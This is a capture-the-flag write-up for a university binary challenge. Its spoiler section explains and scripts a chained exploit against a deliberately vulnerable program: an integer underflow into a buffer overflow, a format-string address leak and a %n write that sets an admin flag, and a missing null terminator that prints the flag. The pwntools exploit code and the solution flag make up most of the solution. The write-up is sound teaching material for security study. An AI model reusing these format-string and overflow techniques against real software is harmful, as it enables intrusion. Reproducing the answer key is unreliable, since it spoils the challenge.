# Defense In Depth

## Authors

- Jarrod Cameron

## Category

- Binary

## Description

My lecturer said having a single point of failure is bad so I've added lots of layers! Finding one vulnerability won't be enough to get the flag this time!

`nc pwn.unswsecurity.com 5001`

## Difficulty

- Child's Play

## Points

420

## Files

- vuln: The binary running on the server

## Solution

<details>
<summary>Spoiler</summary>

### Idea

By chaining several vulnerabilities, the program can be exploited to read the
flag into memory then will print it. Some of the bugs/vulnerabilities are:

- Interger underflow
- Buffer overflows
- Format strings
- Null termination errors

### Walkthrough

#### 1. Initial Reconnaissance

Lets start by checking out the file:

```
$ file ./vuln
./vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=954438e1e53db31cc4756dab1a4b626f21c051f2, for GNU/Linux 3.2.0, not stripped

$ pwn checksec ./vuln
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

$ ./vuln
>>
Option does not exist
+----------------------+
|    * Help Menu *     |
| 1 -> set name        |
| 2 -> print name      |
| 3 -> read the flag   |
| 4 -> print this help |
| 5 -> quit            |
+----------------------+
```

From the above output we can see that a few security mitigations are in place.
Also, running the program and pressing the "enter" key displays the menu.

#### 2. Static Analysis: `set_name()`

If we have a look at the `set_name()` function in radare2 the following part of
the disassembly can be seen:

```
                      │ 0x000013aa 8d45f0         lea eax, [var_10h]                  │
                      │ 0x000013ad 50             push eax                            │
                      │ 0x000013ae 8d83a8e0ffff   lea eax, [ebx - 0x1f58]             │
                      │ ; const char *format                                          │
                      │ 0x000013b4 50             push eax                            │
                      │ ; int scanf(const char *format)                               │
                      │ 0x000013b5 e816feffff     call sym.imp.__isoc99_scanf;[oc]    │
                      │ 0x000013ba 83c410         add esp, 0x10                       │
                      │ 0x000013bd 8b45f0         mov eax, dword [var_10h]            │
                      │ 0x000013c0 83f840         cmp eax, 0x40                       │
                      │ 0x000013c3 7614           jbe 0x13d9                          │
                      └───────────────────────────────────────────────────────────────┘
                              f t
                              │ │
                              │ └───────────────────────────┐
┌─────────────────────────────┘                             │
│                                                           │
```

We can see that the call to `scanf()` looks like `scanf("%u", &var_10h)` (since
`[ebx - 0x1f58]` evaluates to `%u`). After that there is a check to see if
`var_10h` is greater than 0x40 (64), if so then the function returns early. If
the check is passed then the following basic block is executed:

```
            │
        ┌───────────────────────────────────────────────────────┐
        │ [snip]                                                │
        │ 0x000013eb 8b45f0         mov eax, dword [var_10h]    │
        │ 0x000013ee 83e801         sub eax, 1                  │
        │ 0x000013f1 83ec04         sub esp, 4                  │
        │ 0x000013f4 50             push eax                    │
        │ 0x000013f5 8d83a0000000   lea eax, [ebx + 0xa0]       │
        │ 0x000013fb 50             push eax                    │
        │ ; int fildes                                          │
        │ 0x000013fc 6a00           push 0                      │
        │ ; ssize_t read(int fildes, void *buf, size_t nbyte)   │
        │ 0x000013fe e82dfdffff     call sym.imp.read;[of]      │
        │ [snip]                                                │
        └───────────────────────────────────────────────────────┘
            v
            │
```

From the above basic block it can be seen that `read()` is called with the
following arguments: `read(0, &ebx[0xa0], var_10-1)`.

This is a very obvious integer underflow since `var_10` can easily be set to
zero!

This means we can trigger a buffer overflow at `&ebx[0xa0]`, however we need to
know more about the application before exploiting it.

#### 3. Static Analysis: `print_help()`

Next, lets look at the `print_help()` function (the function that is used when
printing the help menu).

```C
static
void
print_help(void)
{
	char buf[256] = {0};
	if (strchr(&ebx[0xe0], '%') && strchr(&ebx[0xe0], 's'))
		return;
	snprintf(buf, sizeof(buf), "%s", &ebx[0xe0]);
	printf(buf);
}
```

On the second last line there seems to be a format string vulnerability!
However, this is only done after `&ebx[0xe0]` is copied into the `buf` array
on the stack.

To leverage this vulnerability into something useful the array `&ebx[0xe0]`
needs to overwritten with something we control. Fortunately, the buffer
overflow discovered in the previous section can be used! This can be seen
below:

```sh
$ cat hak.py
#!/usr/bin/env python3

from pwn import *

def set_name(p, length, name):
    p.recvuntil('>> ')
    p.sendline('1')
    p.sendline(length)
    p.sendline(name)


def print_help(p):
    p.recvuntil('>> ')
    p.sendline('4')
    return p.recvuntil('ZZZ')


def main(p, e):
    # append "ZZZ" to make extracting values easier
    set_name(p, '0', b'A' * 64 + b'%3$pZZZ\x00')
    banner_leak = int(print_help(p)[:-3], 16)
    log.info('&banner = ' + hex(banner_leak))


if __name__ == '__main__':
    p = process('./vuln')
    e = ELF('./vuln')
    main(p, e)
    p.close()

$ python3 hak.py
[+] Starting local process './vuln': pid 10563
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] &banner = 0x565b5080
[*] Stopped process './vuln' (pid 10563)
```

From some "trial and error" using the format string `%3$p` reveals the address
of `&ebx[0xe0]` (aka `thebanner`).

#### 4. Static Analysis: `read_flag()`

Now for the most interesting function, the `read_flag()` function. The first
basic block in this function contains the following three instructions:

```
          │ 0x0000150b 8b8380000000   mov eax, dword [ebx + 0x80]         │
          │ 0x00001511 85c0           test eax, eax                       │
          │ 0x00001513 7514           jne 0x1529                          │
          └───────────────────────────────────────────────────────────────┘
                  f t
                  │ │
```

Or in other words... If `ebx[0x80]` is zero then we follow the _false_ branch
and return. If `ebx[0x80]` is non-zero then we follow the other branch. The
other branch leads to the the following basic block.

```
            │
        ┌──────────────────────────────────────────────────────┐
        │ [snip]                                               │
        │ 0x00001547 e844fcffff     call sym.imp.open;[oe]     │
        │ 0x0000154c 83c410         add esp, 0x10              │
        │ 0x0000154f 8945f4         mov dword [fildes], eax    │
        │ 0x00001552 83ec04         sub esp, 4                 │
        │ ; size_t nbyte                                       │
        │ 0x00001555 6800010000     push 0x100                 │
        │ 0x0000155a 8d83e0010000   lea eax, [ebx + 0x1e0]     │
        │ ; void *buf                                          │
        │ 0x00001560 50             push eax                   │
        │ ; int fildes                                         │
        │ 0x00001561 ff75f4         push dword [fildes]        │
        │ ; ssize_t read(int fildes, void *buf, size_t nbyte)  │
        │ 0x00001564 e8c7fbffff     call sym.imp.read;[of]     │
        │ [snip]                                               │
        │ 0x00001572 e869fcffff     call sym.imp.close;[og]    │
        │ 0x00001577 83c410         add esp, 0x10              │
        └──────────────────────────────────────────────────────┘
            v
            │
```

The above code roughly evaluates to:

```C
int fd = open("./flag.txt", O_RDONLY);
read(fd, &ebx[0x1e0], 0x100);
close(fd);
```

This is great and all, but how do we set the `ebx[0x80]` variable to a non-zero
value? The buffer overflow (from section `2.`) since the buffer starts at
`ebx[0xa0]`. However, the format string can be used instead! Using the
following exploit the `ebx[0x80]` value can be overwritten!

```
$ cat hak.py
#!/usr/bin/env python3

from pwn import *

def set_name(p, length, name):
    p.recvuntil('>> ')
    p.sendline('1')
    p.sendline(length)
    p.sendline(name)

def read_flag(p):
    p.recvuntil('>> ')
    p.sendline('3')

def print_help(p):
    p.recvuntil('>> ')
    p.sendline('4')
    return p.recvuntil('ZZZ')

def main(p, e):

    # append "ZZZ" to make extracting values easier
    set_name(p, '0', b'A' * 64 + b'%3$pZZZ\x00')
    banner_leak = int(print_help(p)[:-3], 16)
    log.info('&banner = ' + hex(banner_leak))

    # Get the address of isadmin
    isadmin_addr = banner_leak - e.symbols['thebanner'] + e.symbols['isadmin']
    log.info('&isadmin = ' + hex(isadmin_addr))

    # overwite the "isadmin" (aka "ebx[0xa0]") variable
    set_name(p, '0', b'A' * 64 + p32(isadmin_addr) + b'%7$nZZZ\x00')
    print_help(p)

    read_flag(p)

if __name__ == '__main__':
    p = process('./vuln')
    e = ELF('./vuln')
    main(p, e)
    p.close()

$ python3 hak.py
[+] Starting local process './vuln': pid 13063
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] &banner = 0x56597080
[*] &isadmin = 0x56597020
[*] Stopped process './vuln' (pid 13063)
```

#### 5. Static Analysis: `print_name()`

So far we've managed to read the flag and store it in memory. But how do we
actually read the flag? It's so close yet so far? We can't use the `%s` format
string modifier since there is a check in `print_help()` to make sure the
string doesn't contain the characters `%` and `s`. However, there's one more
function that we haven't looked at yet.

The `print_name()` function is the most inconspicuous function in the program.
The most important part can be seen below:

```
        │ 0x00001358 8d83a0000000   lea eax, [ebx + 0xa0]               │
        │ ; const char *s                                               │
        │ 0x0000135e 50             push eax                            │
        │ ; int puts(const char *s)                                     │
        │ 0x0000135f e80cfeffff     call sym.imp.puts;[ob]              │
```

All this function does is print the buffer at `&ebx[0xa0]`. This can be used
to print the flag if there is no null terminator between `&ebx[0xa0]` (address
of our name) and `&ebx[0x1e0]` (address of the flag). This can be easily seen
with the diagram below:

```
-------------------------------------------------------------------------------
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASKYLIGHT{...
-------------------------------------------------------------------------------
 ^                                                             ^
 |                                                             |
 |                                                             |
 Location of the name buffer                         Location of flag
```

This can be achieved using the following script:

```
$ cat hak.py
#!/usr/bin/env python3

from pwn import *

def set_name(p, length, name):
    p.recvuntil('>> ')
    p.sendline('1')
    p.sendline(length)
    p.sendline(name)

def print_name(p):
    p.recvuntil('>> ')
    p.sendline('2')

def read_flag(p):
    p.recvuntil('>> ')
    p.sendline('3')

def print_help(p):
    p.recvuntil('>> ')
    p.sendline('4')
    return p.recvuntil('ZZZ')

def main(p, e):

    # append "ZZZ" to make extracting values easier
    set_name(p, '0', b'A' * 64 + b'%3$pZZZ\x00')
    banner_leak = int(print_help(p)[:-3], 16)
    log.info('&banner = ' + hex(banner_leak))

    # Get the address of isadmin
    isadmin_addr = banner_leak - e.symbols['thebanner'] + e.symbols['isadmin']
    log.info('&isadmin = ' + hex(isadmin_addr))

    # overwite the "isadmin" (aka "ebx[0xa0]") variable
    set_name(p, '0', b'A' * 64 + p32(isadmin_addr) + b'%7$nZZZ\x00')
    print_help(p)

    # null terminator bug
    myname_len = e.symbols['flag'] - e.symbols['myname'] + 4
    set_name(p, '0', b'A' * myname_len)

    # read the flag into memory
    read_flag(p)

    # print the name, then the flag
    print_name(p)

    p.interactive()

if __name__ == '__main__':
    # NOTE: You can change this to `remote('ip', port)` to pwn it remotely
    p = process('./vuln')
    e = ELF('./vuln')
    main(p, e)
    p.close()

$ python3 hak.py
[+] Starting local process './vuln': pid 13409
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] &banner = 0x5663f080
[*] &isadmin = 0x5663f020
[*] Switching to interactive mode
How can you forget your name?
AAAA ... AAAASKYLIGHT{Ctfs_ar3_l1ke_OnIoNS!_OnIoNs_hav3_Lay3rz!}

>> $
```

### Flag

```
SKYLIGHT{Ctfs_ar3_l1ke_OnIoNS!_OnIoNs_hav3_Lay3rz!}
```

</details>
